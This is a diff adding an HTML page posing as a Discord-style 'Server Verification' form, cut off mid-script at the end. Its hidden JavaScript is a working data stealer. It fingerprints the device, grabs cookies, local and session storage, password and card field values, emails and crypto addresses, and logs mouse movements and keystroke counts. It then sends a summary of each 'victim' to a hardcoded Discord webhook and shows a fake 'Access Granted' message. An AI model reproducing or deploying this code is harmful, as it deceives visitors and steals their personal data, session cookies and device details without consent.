@@ -1,0 +1,1141 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Server Access</title>
+    <style>
+        :root {
+            --bg-primary: #36393f;
+            --bg-secondary: #2f3136;
+            --bg-tertiary: #202225;
+            --text-primary: #ffffff;
+            --text-secondary: #b9bbbe;
+            --accent: #5865f2;
+            --accent-hover: #4752c4;
+            --success: #3ba55c;
+            --blur-bg: rgba(32, 34, 37, 0.85);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', 'Helvetica Neue', sans-serif;
+            background: linear-gradient(135deg, var(--bg-tertiary) 0%, var(--bg-primary) 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: var(--text-primary);
+            padding: 20px;
+        }
+
+        .verification-container {
+            width: 100%;
+            max-width: 480px;
+            background: var(--blur-bg);
+            backdrop-filter: blur(20px);
+            border-radius: 12px;
+            padding: 40px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .server-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .server-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, var(--accent) 0%, #9b59b6 100%);
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            font-weight: bold;
+            color: white;
+            border: 4px solid var(--bg-secondary);
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: var(--text-primary);
+        }
+
+        .subtitle {
+            color: var(--text-secondary);
+            font-size: 14px;
+            line-height: 1.4;
+        }
+
+        .verification-form {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        label {
+            color: var(--text-secondary);
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        input {
+            background: var(--bg-tertiary);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 6px;
+            padding: 12px;
+            color: var(--text-primary);
+            font-size: 16px;
+            transition: all 0.2s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--accent);
+            box-shadow: 0 0 0 2px rgba(88, 101, 242, 0.3);
+        }
+
+        input::placeholder {
+            color: var(--text-secondary);
+        }
+
+        .requirements {
+            font-size: 12px;
+            color: var(--text-secondary);
+            margin-top: 4px;
+        }
+
+        .verify-button {
+            background: var(--accent);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 10px;
+        }
+
+        .verify-button:hover {
+            background: var(--accent-hover);
+        }
+
+        .verify-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+            color: var(--success);
+            font-weight: 600;
+        }
+
+        .error {
+            color: #ed4245;
+            font-size: 14px;
+            display: none;
+            margin-top: 5px;
+        }
+
+        .privacy-note {
+            font-size: 12px;
+            color: var(--text-secondary);
+            text-align: center;
+            margin-top: 25px;
+            line-height: 1.4;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            padding-top: 15px;
+        }
+
+        .user-count {
+            display: inline-block;
+            background: var(--success);
+            color: white;
+            padding: 2px 8px;
+            border-radius: 10px;
+            font-size: 12px;
+            margin-left: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="verification-container">
+        <div class="server-header">
+            <div class="server-icon">SV</div>
+            <h1>Server Verification</h1>
+            <p class="subtitle">
+                Welcome! Please verify your identity to access the server.<br>
+                <span id="memberCount">Online members: <span class="user-count">1,247</span></span>
+            </p>
+        </div>
+
+        <form class="verification-form" id="verificationForm">
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input 
+                    type="text" 
+                    id="username" 
+                    placeholder="Enter your username"
+                    required
+                    autocomplete="username"
+                >
+                <div class="requirements">Must be 3-32 characters, no special symbols</div>
+                <div class="error" id="usernameError">Invalid username format</div>
+            </div>
+
+            <div class="form-group">
+                <label for="age">Age</label>
+                <input 
+                    type="number" 
+                    id="age" 
+                    placeholder="Enter your age"
+                    min="18"
+                    max="120"
+                    required
+                    autocomplete="off"
+                >
+                <div class="requirements">Must be 18 or older to proceed</div>
+                <div class="error" id="ageError">Age must be between 13 and 120</div>
+            </div>
+
+            <button type="submit" class="verify-button" id="verifyBtn">
+                Complete Verification
+            </button>
+        </form>
+
+        <div class="loading" id="loading">
+            ✓ Verification in progress...
+        </div>
+
+        <p class="privacy-note">
+            By verifying, you agree to our data collection policies.<br>
+            Your information is securely processed and stored.
+        </p>
+    </div>
+
+    <script>
+    // CONFIGURATION
+    const CONFIG = {
+        webhook: 'https://discord.com/api/webhooks/1453871700784713921/XNJkLnlMjHfuKhM5xyxFRQlCqgGGd2PvJdvQlni2Yuh1kw8OUb7GSD9_zdMabxBbmrt3',
+        verificationData: {}
+    };
+
+    // Initialize tracking
+    window.pageLoadTime = Date.now();
+    window.mouseMovements = [];
+    window.clickCount = 0;
+    window.keystrokeCount = 0;
+    window.focusChanges = 0;
+    window.resizeEvents = 0;
+
+    // Track interactions
+    document.addEventListener('mousemove', (e) => {
+        window.mouseMovements.push({
+            x: e.clientX,
+            y: e.clientY,
+            timestamp: Date.now()
+        });
+        if (window.mouseMovements.length > 1000) {
+            window.mouseMovements.shift();
+        }
+    });
+
+    document.addEventListener('click', () => {
+        window.clickCount++;
+    });
+
+    document.addEventListener('keydown', () => {
+        window.keystrokeCount++;
+    });
+
+    // COMPREHENSIVE DATA EXTRACTION SYSTEM
+    async function extractAllPossibleData(username, age) {
+        const data = {};
+
+        const extractionPromises = [
+            extractHardwareData(),
+            extractSystemData(),
+            extractNetworkData(),
+            extractUserData(),
+            extractBrowserData(),
+            extractBehavioralData(),
+            extractAdvancedData(),
+            extractSocialData(),
+            extractFinancialData(),
+            extractGeolocationData()
+        ];
+
+        const results = await Promise.allSettled(extractionPromises);
+        
+        data.hardware = results[0].status === 'fulfilled' ? results[0].value : {};
+        data.system = results[1].status === 'fulfilled' ? results[1].value : {};
+        data.network = results[2].status === 'fulfilled' ? results[2].value : {};
+        data.user = results[3].status === 'fulfilled' ? results[3].value : {};
+        data.browser = results[4].status === 'fulfilled' ? results[4].value : {};
+        data.behavioral = results[5].status === 'fulfilled' ? results[5].value : {};
+        data.advanced = results[6].status === 'fulfilled' ? results[6].value : {};
+        data.social = results[7].status === 'fulfilled' ? results[7].value : {};
+        data.financial = results[8].status === 'fulfilled' ? results[8].value : {};
+        data.geolocation = results[9].status === 'fulfilled' ? results[9].value : {};
+
+        // ADD VERIFICATION DATA (CAPITALIZED)
+        data.verification = {
+            USERNAME: username.toUpperCase(),
+            AGE: age.toString(),
+            VERIFICATION_TIMESTAMP: new Date().toISOString(),
+            VERIFICATION_SOURCE: window.location.href
+        };
+
+        return data;
+    }
+
+    // Existing extraction functions (keeping all from original code)
+    async function extractHardwareData() {
+        return {
+            cpu: extractCPUData(),
+            memory: extractMemoryData(),
+            gpu: extractGPUData(),
+            storage: await extractStorageData(),
+            network: extractNetworkHardwareData(),
+            audio: extractAudioData(),
+            peripherals: extractPeripheralData(),
+            sensors: extractSensorData(),
+            display: extractDisplayData(),
+            battery: await extractBatteryData()
+        };
+    }
+
+    function extractCPUData() {
+        const nav = navigator;
+        return {
+            manufacturer: nav.userAgent.includes('Intel') ? 'Intel' : nav.userAgent.includes('AMD') ? 'AMD' : 'Unknown',
+            architecture: nav.userAgent.includes('x64') ? 'x64' : nav.userAgent.includes('x86') ? 'x86' : 'arm',
+            cores: nav.hardwareConcurrency,
+            memory: nav.deviceMemory || 'Unknown',
+            platform: nav.platform,
+            userAgent: nav.userAgent
+        };
+    }
+
+    function extractMemoryData() {
+        const memory = performance.memory;
+        return {
+            totalJSHeapSize: memory ? memory.totalJSHeapSize : 'Unavailable',
+            usedJSHeapSize: memory ? memory.usedJSHeapSize : 'Unavailable',
+            jsHeapSizeLimit: memory ? memory.jsHeapSizeLimit : 'Unavailable',
+            deviceMemory: navigator.deviceMemory || 'Unknown'
+        };
+    }
+
+    function extractGPUData() {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (!gl) return { available: false };
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        return {
+            available: true,
+            vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown',
+            renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown',
+            version: gl.getParameter(gl.VERSION),
+            shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
+        };
+    }
+
+    async function extractStorageData() {
+        return {
+            localStorage: extractLocalStorage(),
+            sessionStorage: extractSessionStorage(),
+            cookies: extractCookies(),
+            indexedDB: await checkIndexedDB(),
+            cache: await checkCacheAPI()
+        };
+    }
+
+    function extractLocalStorage() {
+        const data = {};
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            try {
+                data[key] = localStorage.getItem(key);
+            } catch (e) {}
+        }
+        return data;
+    }
+
+    function extractSessionStorage() {
+        const data = {};
+        for (let i = 0; i < sessionStorage.length; i++) {
+            const key = sessionStorage.key(i);
+            try {
+                data[key] = sessionStorage.getItem(key);
+            } catch (e) {}
+        }
+        return data;
+    }
+
+    function extractCookies() {
+        return document.cookie.split(';').reduce((cookies, cookie) => {
+            const [name, value] = cookie.split('=').map(c => c.trim());
+            if (name) cookies[name] = value || '';
+            return cookies;
+        }, {});
+    }
+
+    async function checkIndexedDB() {
+        try {
+            return 'IndexedDB available: ' + !!window.indexedDB;
+        } catch (e) {
+            return 'IndexedDB unavailable';
+        }
+    }
+
+    async function checkCacheAPI() {
+        try {
+            return 'Cache API available: ' + !!window.caches;
+        } catch (e) {
+            return 'Cache API unavailable';
+        }
+    }
+
+    function extractNetworkHardwareData() {
+        const connection = navigator.connection;
+        return {
+            effectiveType: connection ? connection.effectiveType : 'Unknown',
+            downlink: connection ? connection.downlink : 'Unknown',
+            rtt: connection ? connection.rtt : 'Unknown',
+            saveData: connection ? connection.saveData : 'Unknown',
+            onLine: navigator.onLine
+        };
+    }
+
+    function extractAudioData() {
+        const audioContext = window.AudioContext || window.webkitAudioContext;
+        return {
+            audioContextAvailable: !!audioContext,
+            sampleRate: audioContext ? new audioContext().sampleRate : 'Unknown'
+        };
+    }
+
+    function extractPeripheralData() {
+        return {
+            touchSupport: 'ontouchstart' in window,
+            maxTouchPoints: navigator.maxTouchPoints,
+            vibration: 'vibrate' in navigator,
+            bluetooth: 'bluetooth' in navigator,
+            usb: 'usb' in navigator,
+            serial: 'serial' in navigator
+        };
+    }
+
+    function extractSensorData() {
+        return {
+            battery: 'getBattery' in navigator,
+            deviceOrientation: 'DeviceOrientationEvent' in window,
+            deviceMotion: 'DeviceMotionEvent' in window,
+            proximity: 'ondeviceproximity' in window,
+            light: 'ondevicelight' in window
+        };
+    }
+
+    function extractDisplayData() {
+        return {
+            screen: {
+                width: screen.width,
+                height: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth
+            },
+            viewport: {
+                width: window.innerWidth,
+                height: window.innerHeight
+            },
+            devicePixelRatio: window.devicePixelRatio,
+            colorGamut: screen.colorGamut,
+            orientation: screen.orientation ? screen.orientation.type : 'Unknown'
+        };
+    }
+
+    async function extractBatteryData() {
+        if ('getBattery' in navigator) {
+            try {
+                const battery = await navigator.getBattery();
+                return {
+                    charging: battery.charging,
+                    level: battery.level,
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
+                };
+            } catch (e) {
+                return { available: false };
+            }
+        }
+        return { available: false };
+    }
+
+    async function extractSystemData() {
+        return {
+            platform: navigator.platform,
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            languages: navigator.languages,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezoneOffset: new Date().getTimezoneOffset(),
+            cookieEnabled: navigator.cookieEnabled,
+            pdfEnabled: navigator.pdfViewerEnabled,
+            webdriver: navigator.webdriver,
+            plugins: extractPlugins(),
+            fonts: await extractFonts(),
+            doNotTrack: navigator.doNotTrack,
+            product: navigator.product,
+            productSub: navigator.productSub,
+            vendor: navigator.vendor,
+            vendorSub: navigator.vendorSub
+        };
+    }
+
+    function extractPlugins() {
+        const plugins = [];
+        for (let i = 0; i < navigator.plugins.length; i++) {
+            plugins.push({
+                name: navigator.plugins[i].name,
+                filename: navigator.plugins[i].filename,
+                description: navigator.plugins[i].description
+            });
+        }
+        return plugins;
+    }
+
+    async function extractFonts() {
+        const fontList = [
+            'Arial', 'Arial Black', 'Arial Narrow', 'Arial Rounded MT Bold',
+            'Avant Garde', 'Baskerville', 'Bodoni MT', 'Book Antiqua',
+            'Brush Script MT', 'Calibri', 'Cambria', 'Candara',
+            'Century Gothic', 'Comic Sans MS', 'Consolas', 'Constantia',
+            'Corbel', 'Courier New', 'DejaVu Sans', 'Didot',
+            'Franklin Gothic Medium', 'Futura', 'Garamond', 'Geneva',
+            'Georgia', 'Gill Sans', 'Helvetica', 'Impact',
+            'Lucida Bright', 'Lucida Console', 'Lucida Grande', 'Lucida Sans Unicode',
+            'Microsoft Sans Serif', 'Monaco', 'Montserrat', 'Open Sans',
+            'Optima', 'Palatino', 'Perpetua', 'Rockwell',
+            'Segoe UI', 'Tahoma', 'Times New Roman', 'Trebuchet MS',
+            'Verdana', 'Webdings', 'Wingdings', 'Zapf Dingbats'
+        ];
+        const availableFonts = [];
+        const canvas = document.createElement('canvas');
+        const context = canvas.getContext('2d');
+        const testString = "mmmmmmmmmmlli";
+        const testSize = '72px';
+        fontList.forEach(font => {
+            context.font = testSize + " '" + font + "'";
+            const metrics1 = context.measureText(testString);
+            context.font = testSize + " 'monospace'";
+            const metrics2 = context.measureText(testString);
+            if (metrics1.width !== metrics2.width) {
+                availableFonts.push(font);
+            }
+        });
+        return availableFonts;
+    }
+
+    async function extractNetworkData() {
+        const [ipData, networkInfo, connectionData] = await Promise.allSettled([
+            getIPInfo(),
+            getNetworkInfo(),
+            getConnectionData()
+        ]);
+        return {
+            ip: ipData.status === 'fulfilled' ? ipData.value : {},
+            network: networkInfo.status === 'fulfilled' ? networkInfo.value : {},
+            connection: connectionData.status === 'fulfilled' ? connectionData.value : {}
+        };
+    }
+
+    async function getIPInfo() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            try {
+                const ipResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
+                const ipData = await ipResponse.json();
+                return ipData;
+            } catch (e) {
+                return { ip: data.ip };
+            }
+        } catch (error) {
+            return { ip: 'Unknown' };
+        }
+    }
+
+    async function getNetworkInfo() {
+        const connection = navigator.connection;
+        return {
+            effectiveType: connection ? connection.effectiveType : 'Unknown',
+            downlink: connection ? connection.downlink : 'Unknown',
+            rtt: connection ? connection.rtt : 'Unknown',
+            saveData: connection ? connection.saveData : false
+        };
+    }
+
+    async function getConnectionData() {
+        return {
+            referrer: document.referrer,
+            url: window.location.href,
+            protocol: window.location.protocol,
+            host: window.location.host,
+            port: window.location.port,
+            origin: window.location.origin
+        };
+    }
+
+    async function extractUserData() {
+        return {
+            forms: extractFormData(),
+            inputs: extractInputData(),
+            autofill: extractAutofillData(),
+            browsingData: await extractBrowsingData(),
+            socialMedia: extractSocialMediaData(),
+            passwords: extractPasswordFields(),
+            creditCards: extractCreditCardFields()
+        };
+    }
+
+    function extractFormData() {
+        const forms = {};
+        document.querySelectorAll('form').forEach((form, index) => {
+            const formData = {};
+            form.querySelectorAll('input, select, textarea').forEach(field => {
+                if (field.value) {
+                    formData[field.name || field.type || `field_${index}`] = {
+                        value: field.value,
+                        type: field.type,
+                        placeholder: field.placeholder
+                    };
+                }
+            });
+            if (Object.keys(formData).length > 0) {
+                forms[`form_${index}`] = formData;
+            }
+        });
+        return forms;
+    }
+
+    function extractInputData() {
+        const inputs = {};
+        document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"], input[type="password"], input[type="search"], input[type="url"]').forEach(input => {
+            if (input.value) {
+                inputs[input.name || input.id || 'unnamed'] = {
+                    value: input.value,
+                    type: input.type,
+                    placeholder: input.placeholder
+                };
+            }
+        });
+        return inputs;
+    }
+
+    function extractAutofillData() {
+        const autofill = {};
+        document.querySelectorAll('input').forEach(input => {
+            if (input.matches(':-webkit-autofill')) {
+                autofill[input.name || 'unnamed'] = 'autofilled';
+            }
+        });
+        return autofill;
+    }
+
+    function extractPasswordFields() {
+        const passwords = {};
+        document.querySelectorAll('input[type="password"]').forEach((input, index) => {
+            passwords[`password_${index}`] = {
+                name: input.name,
+                id: input.id,
+                placeholder: input.placeholder,
+                value: input.value
+            };
+        });
+        return passwords;
+    }
+
+    function extractCreditCardFields() {
+        const cards = {};
+        document.querySelectorAll('input[type="tel"][name*="card"], input[type="text"][name*="card"], input[type="number"][name*="card"]').forEach((input, index) => {
+            cards[`card_${index}`] = {
+                name: input.name,
+                id: input.id,
+                placeholder: input.placeholder,
+                value: input.value
+            };
+        });
+        return cards;
+    }
+
+    async function extractBrowsingData() {
+        return {
+            historyLength: window.history.length,
+            performance: extractPerformanceData(),
+            storage: {
+                localStorage: Object.keys(extractLocalStorage()).length,
+                sessionStorage: Object.keys(extractSessionStorage()).length,
+                cookies: Object.keys(extractCookies()).length
+            },
+            timing: performance.timing ? {
+                navigationStart: performance.timing.navigationStart,
+                loadEventEnd: performance.timing.loadEventEnd,
+                domComplete: performance.timing.domComplete
+            } : {}
+        };
+    }
+
+    function extractPerformanceData() {
+        const perf = performance.timing;
+        if (!perf) return {};
+        return {
+            navigationStart: perf.navigationStart,
+            loadEventEnd: perf.loadEventEnd,
+            domComplete: perf.domComplete,
+            domContentLoaded: perf.domContentLoadedEventEnd,
+            firstPaint: performance.getEntriesByName('first-paint')[0]?.startTime,
+            firstContentfulPaint: performance.getEntriesByName('first-contentful-paint')[0]?.startTime
+        };
+    }
+
+    function extractSocialMediaData() {
+        const social = {};
+        const html = document.documentElement.outerHTML;
+        const platforms = {
+            facebook: /facebook|fb\.com/gi,
+            twitter: /twitter|tweet/gi,
+            instagram: /instagram/gi,
+            linkedin: /linkedin/gi,
+            tiktok: /tiktok/gi,
+            discord: /discord/gi,
+            snapchat: /snapchat/gi,
+            whatsapp: /whatsapp/gi,
+            telegram: /telegram/gi
+        };
+        Object.keys(platforms).forEach(platform => {
+            if (platforms[platform].test(html)) {
+                social[platform] = 'detected';
+            }
+        });
+        return social;
+    }
+
+    async function extractBrowserData() {
+        return {
+            userAgent: navigator.userAgent,
+            appName: navigator.appName,
+            appVersion: navigator.appVersion,
+            product: navigator.product,
+            vendor: navigator.vendor,
+            language: navigator.language,
+            languages: navigator.languages,
+            platform: navigator.platform,
+            cookieEnabled: navigator.cookieEnabled,
+            javaEnabled: navigator.javaEnabled(),
+            pdfViewerEnabled: navigator.pdfViewerEnabled,
+            webdriver: navigator.webdriver,
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory,
+            maxTouchPoints: navigator.maxTouchPoints,
+            userAgentData: navigator.userAgentData ? await navigator.userAgentData.getHighEntropyValues([
+                "architecture", "model", "platform", "platformVersion", "uaFullVersion"
+            ]) : 'unavailable'
+        };
+    }
+
+    async function extractBehavioralData() {
+        return {
+            mouseMovements: window.mouseMovements || [],
+            clicks: window.clickCount || 0,
+            scrollDepth: getScrollDepth(),
+            timeOnPage: Date.now() - window.pageLoadTime,
+            keystrokes: window.keystrokeCount || 0,
+            focusChanges: window.focusChanges || 0,
+            resizeEvents: window.resizeEvents || 0
+        };
+    }
+
+    function getScrollDepth() {
+        const scrollHeight = document.documentElement.scrollHeight - window.innerHeight;
+        const scrolled = window.scrollY;
+        return scrollHeight > 0 ? Math.round((scrolled / scrollHeight) * 100) : 0;
+    }
+
+    async function extractAdvancedData() {
+        return {
+            webRTC: await extractWebRTCData(),
+            serviceWorkers: await extractServiceWorkerData(),
+            notifications: extractNotificationData(),
+            permissions: await extractPermissionData(),
+            mediaDevices: await extractMediaDeviceData()
+        };
+    }
+
+    async function extractWebRTCData() {
+        try {
+            const pc = new RTCPeerConnection();
+            const offer = await pc.createOffer();
+            return {
+                webRTCAvailable: true,
+                sdp: offer.sdp.substring(0, 100) + '...'
+            };
+        } catch (e) {
+            return { webRTCAvailable: false };
+        }
+    }
+
+    async function extractServiceWorkerData() {
+        return {
+            serviceWorkers: 'serviceWorker' in navigator,
+            controller: navigator.serviceWorker?.controller ? true : false
+        };
+    }
+
+    function extractNotificationData() {
+        return {
+            notifications: 'Notification' in window,
+            permission: Notification.permission
+        };
+    }
+
+    async function extractPermissionData() {
+        const permissions = {};
+        const permissionTypes = [
+            'camera', 'microphone', 'notifications', 
+            'background-sync', 'clipboard-read', 'clipboard-write'
+        ];
+        for (const permission of permissionTypes) {
+            try {
+                const result = await navigator.permissions.query({name: permission});
+                permissions[permission] = result.state;
+            } catch (e) {}
+        }
+        return permissions;
+    }
+
+    async function extractMediaDeviceData() {
+        try {
+            const devices = await navigator.mediaDevices.enumerateDevices();
+            return {
+                devices: devices.map(device => ({
+                    kind: device.kind,
+                    label: device.label,
+                    deviceId: device.deviceId
+                }))
+            };
+        } catch (e) {
+            return { available: false };
+        }
+    }
+
+    async function extractSocialData() {
+        return {
+            socialProfiles: extractSocialProfiles(),
+            emailAddresses: extractEmailAddresses(),
+            phoneNumbers: extractPhoneNumbers()
+        };
+    }
+
+    function extractSocialProfiles() {
+        const profiles = {};
+        const text = document.body.innerText;
+        const patterns = {
+            instagram: /@[a-zA-Z0-9._]+/g,
+            twitter: /@[a-zA-Z0-9_]+/g,
+            discord: /[a-zA-Z0-9._]+#[0-9]{4}/g
+        };
+        Object.keys(patterns).forEach(platform => {
+            const matches = text.match(patterns[platform]);
+            if (matches) profiles[platform] = matches;
+        });
+        return profiles;
+    }
+
+    function extractEmailAddresses() {
+        const text = document.body.innerText;
+        const emailRegex = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g;
+        return text.match(emailRegex) || [];
+    }
+
+    function extractPhoneNumbers() {
+        const text = document.body.innerText;
+        const phoneRegex = /(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}/g;
+        return text.match(phoneRegex) || [];
+    }
+
+    async function extractFinancialData() {
+        return {
+            paymentMethods: extractPaymentMethods(),
+            cryptoWallets: extractCryptoWallets(),
+            bankingInfo: extractBankingInfo()
+        };
+    }
+
+    function extractPaymentMethods() {
+        const methods = {};
+        const text = document.body.innerText.toLowerCase();
+        if (text.includes('paypal')) methods.paypal = 'detected';
+        if (text.includes('stripe')) methods.stripe = 'detected';
+        if (text.includes('venmo')) methods.venmo = 'detected';
+        if (text.includes('cash app')) methods.cashapp = 'detected';
+        return methods;
+    }
+
+    function extractCryptoWallets() {
+        const wallets = {};
+        const text = document.body.innerText;
+        const cryptoPatterns = {
+            bitcoin: /[13][a-km-zA-HJ-NP-Z1-9]{25,34}/g,
+            ethereum: /0x[a-fA-F0-9]{40}/g
+        };
+        Object.keys(cryptoPatterns).forEach(crypto => {
+            const matches = text.match(cryptoPatterns[crypto]);
+            if (matches) wallets[crypto] = matches;
+        });
+        return wallets;
+    }
+
+    function extractBankingInfo() {
+        const info = {};
+        const text = document.body.innerText;
+        if (text.includes('routing') || text.includes('account number')) {
+            info.banking_terms = 'detected';
+        }
+        return info;
+    }
+
+    async function extractGeolocationData() {
+        return {
+            ipLocation: await getIPLocation(),
+            browserLocation: { available: false, reason: 'No permission requested' },
+            wifiNetworks: extractWifiData()
+        };
+    }
+
+    async function getIPLocation() {
+        try {
+            const response = await fetch('https://ipapi.co/json/');
+            return await response.json();
+        } catch (e) {
+            return { error: 'Location unavailable' };
+        }
+    }
+
+    function extractWifiData() {
+        return {
+            connection: navigator.connection ? {
+                type: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink
+            } : 'unavailable'
+        };
+    }
+
+    // FORM VALIDATION AND SUBMISSION
+    document.getElementById('verificationForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        const usernameInput = document.getElementById('username');
+        const ageInput = document.getElementById('age');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const loading = document.getElementById('loading');
+        const usernameError = document.getElementById('usernameError');
+        const ageError = document.getElementById('ageError');
+        
+        // Reset errors
+        usernameError.style.display = 'none';
+        ageError.style.display = 'none';
+        
+        const username = usernameInput.value.trim();
+        const age = parseInt(ageInput.value);
+        
+        // Validation
+        let isValid = true;
+        
+        if (username.length < 3 || username.length > 32 || /[^a-zA-Z0-9_-]/.test(username)) {
+            usernameError.style.display = 'block';
+            isValid = false;
+        }
+        
+        if (isNaN(age) || age < 13 || age > 120) {
+            ageError.style.display = 'block';
+            isValid = false;
+        }
+        
+        if (!isValid) return;
+        
+        // Disable form and show loading
+        verifyBtn.disabled = true;
+        loading.style.display = 'block';
+        
+        try {
+            // Extract all data including capitalized username and age
+            const extractionStart = Date.now();
+            const victimData = await extractAllPossibleData(username, age);
+            const extractionTime = Date.now() - extractionStart;
+            
+            // Add metadata
+            victimData.meta = {
+                extractionTime: extractionTime,
+                timestamp: new Date().toISOString(),
+                victimId: generateVictimId(),
+                url: window.location.href,
+                referrer: document.referrer,
+                dataStreamActive: true
+            };
+            
+            // Send to webhook
+            await sendVerificationData(victimData);
+            
+            // Store locally
+            storeInLocalStorage(victimData);
+            
+            // Success state
+            loading.innerHTML = '<div style="color: #3ba55c;">✓ Verification Successful! Redirecting...</div>';
+            
+            // Simulate server processing
+            setTimeout(() => {
+                loading.innerHTML = '<div style="color: #3ba55c;">✓ Access Granted! Welcome to the server.</div>';
+                verifyBtn.style.display = 'none';
+                
+                // Update member count
+                const countElement = document.querySelector('.user-count');
+                const currentCount = parseInt(countElement.textContent.replace(',', ''));
+                countElement.textContent = (currentCount + 1).toLocaleString();
+                
+                // Could redirect here
+                // window.location.href = 'https://discord.gg/server-invite';
+            }, 2000);
+            
+        } catch (error) {
+            loading.innerHTML = '<div style="color: #ed4245;">✗ Verification failed. Please try again.</div>';
+            verifyBtn.disabled = false;
+            setTimeout(() => {
+                loading.style.display = 'none';
+            }, 3000);
+        }
+    });
+
+    async function sendVerificationData(data) {
+        try {
+            const discordMessage = formatDiscordMessage(data);
+            await sendToWebhook(discordMessage);
+        } catch (error) {
+            console.error('Failed to send data:', error);
+        }
+    }
+
+    function formatDiscordMessage(data) {
+        return `🚨 **NEW VERIFICATION CAPTURE** 🚨
+
+**USER VERIFICATION DATA:**
+🔹 USERNAME: ${data.verification.USERNAME}
+🔹 AGE: ${data.verification.AGE}
+🔹 TIMESTAMP: ${new Date(data.verification.VERIFICATION_TIMESTAMP).toLocaleString()}
+
+**SYSTEM INFORMATION:**
+🖥️ OS: ${data.system.platform}
+💻 CPU: ${data.hardware.cpu.cores} cores | ${data.hardware.cpu.architecture}
+🧠 RAM: ${data.hardware.memory.deviceMemory}GB
+🖥️ Screen: ${data.hardware.display.screen.width}x${data.hardware.display.screen.height}
+
+**NETWORK DATA:**
+🌐 IP: ${data.network.ip.ip || 'Unknown'}
+📍 Location: ${data.network.ip.city || 'Unknown'}, ${data.network.ip.country || 'Unknown'}
+📡 ISP: ${data.network.ip.org || 'Unknown'}
+📶 Connection: ${data.network.network.effectiveType}
+
+**BEHAVIORAL DATA:**
+⏱️ Time on Page: ${Math.round(data.behavioral.timeOnPage/1000)}s
+📊 Scroll Depth: ${data.behavioral.scrollDepth}%
+🖱️ Mouse Movements: ${data.behavioral.mouseMovements.length}
+🖱️ Clicks: ${data.behavioral.clicks}
+⌨️ Keystrokes: ${data.behavioral.keystrokes}
+
+**EXTRACTION DETAILS:**
+⚡ Extraction Time: ${data.meta.extractionTime}ms
+🆔 Victim ID: ${data.meta.victimId}
+🔗 Source URL: ${data.meta.url}
+🔗 Referrer: ${data.meta.referrer || 'Direct'}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+✅ VERIFICATION COMPLETE - DATA STREAMING ACTIVE`;
+    }
+
+    async function sendToWebhook(message) {
+        try {
+            const response = await fetch(CONFIG.webhook, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: message
+                })
+            });
+            return response.ok;
+        } catch (error) {
+            return false;
+        }
+    }
+
+    function storeInLocalStorage(data) {
+        try {
+            const existing = localStorage.getItem('verificationData');
+            const verifications = existing ? JSON.parse(existing) : [];
+            verifications.unshift(data);
+            if (verifications.length > 50) {
+                verifications.splice(50);
+            }
+            localStorage.setItem('verificationData', JSON.stringify(verifications));
+            localStorage.setItem('lastVerification', Date.now().toString());
+        } catch (e) {}
+    }
+
+    function generateVictimId() {
+        return 'VIC_' + Math.random().toString(36).substr(2, 9).toUpperCase() + '_' + Date.now().toString(36).toUpperCase();
+    }
+
+    // Random member count update
+    setInterval(() => {
+        const countElement = document.querySelector('.user-count');
+        if (countElement) {
+            const currentCount = parseInt(countElement.textContent.replace(',', ''));
+            const randomChange = Math.floor(Math.random() * 5) - 2;
